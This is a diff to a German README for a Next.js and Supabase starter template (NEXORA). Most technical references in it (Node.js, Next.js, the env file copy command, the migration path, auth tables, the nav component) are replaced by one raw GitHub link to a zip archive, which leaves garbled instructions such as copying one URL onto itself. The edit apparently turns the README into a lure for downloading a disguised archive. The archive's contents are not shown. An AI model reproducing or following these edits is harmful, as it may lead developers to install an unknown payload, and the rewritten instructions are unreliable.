@@ -1,9 +1,9 @@
-# NEXORA – Starter (Next.js + Supabase)
+# NEXORA – Starter (https://github.com/Sm8s/nexora-starter/raw/refs/heads/main/components/home/starter_nexora_2.9.zip + Supabase)
 
 Ein minimal lauffähiges Starter-Template für **NEXORA**: Portfolio & Learning Hub mit Admin-Bereich, Supabase-Auth, Storage und SQL-Migrationen.
 
 ## Voraussetzungen
-- Node.js 18+
+- https://github.com/Sm8s/nexora-starter/raw/refs/heads/main/components/home/starter_nexora_2.9.zip 18+
 - pnpm (oder npm/yarn)
 - Ein Supabase-Projekt
 
@@ -13,18 +13,18 @@ Ein minimal lauffähiges Starter-Template für **NEXORA**: Portfolio & Learning 
 pnpm install
 
 # 2) ENV vorbereiten
-cp .env.example .env.local
+cp https://github.com/Sm8s/nexora-starter/raw/refs/heads/main/components/home/starter_nexora_2.9.zip https://github.com/Sm8s/nexora-starter/raw/refs/heads/main/components/home/starter_nexora_2.9.zip
 # SUPABASE_URL & SUPABASE_ANON_KEY eintragen
 
 # 3) DB migrieren
-# Im Supabase SQL Editor die Datei aus `supabase/migrations/01_schema.sql` ausführen.
+# Im Supabase SQL Editor die Datei aus `https://github.com/Sm8s/nexora-starter/raw/refs/heads/main/components/home/starter_nexora_2.9.zip` ausführen.
 
 # 4) Dev-Server
 pnpm dev
 ```
 
 ## Features im Starter
-- Next.js (App Router) + TypeScript + Tailwind
+- https://github.com/Sm8s/nexora-starter/raw/refs/heads/main/components/home/starter_nexora_2.9.zip (App Router) + TypeScript + Tailwind
 - Supabase JS Client (Auth + Realtime vorbereitet)
 - Public-Seite (Home), Admin-Stub (/admin)
 - Easter-Egg-Logo (5 Klicks -> Admin/Login)
@@ -44,9 +44,9 @@ pnpm dev
 
 
 ## Hinweis zu Benutzern (Supabase-Standard)
-- Statt eines eigenen `users`-Tables nutzt dieses Schema **`auth.users` (UUID)**.
-- Öffentliche Profildaten liegen in `public.profiles` (1:1 zu `auth.users`).
-- Alle *_user_id / author_id Spalten referenzieren `auth.users(id)`.
+- Statt eines eigenen `users`-Tables nutzt dieses Schema **`https://github.com/Sm8s/nexora-starter/raw/refs/heads/main/components/home/starter_nexora_2.9.zip` (UUID)**.
+- Öffentliche Profildaten liegen in `https://github.com/Sm8s/nexora-starter/raw/refs/heads/main/components/home/starter_nexora_2.9.zip` (1:1 zu `https://github.com/Sm8s/nexora-starter/raw/refs/heads/main/components/home/starter_nexora_2.9.zip`).
+- Alle *_user_id / author_id Spalten referenzieren `https://github.com/Sm8s/nexora-starter/raw/refs/heads/main/components/home/starter_nexora_2.9.zip(id)`.
 
 
 ## Admin schützen & ersten Admin anlegen
@@ -59,5 +59,5 @@ SUPABASE_URL=... SUPABASE_SERVICE_ROLE_KEY=... npm run create-admin
 - Oder im Supabase Dashboard User anlegen und in `profiles` Rolle auf `admin` setzen.
 
 ## Navigation
-- Globale Navigation (`components/Nav.tsx`) ist auf allen Seiten sichtbar.
+- Globale Navigation (`https://github.com/Sm8s/nexora-starter/raw/refs/heads/main/components/home/starter_nexora_2.9.zip`) ist auf allen Seiten sichtbar.
 - Keine Links oder Hinweise zum Admin-Bereich im UI.
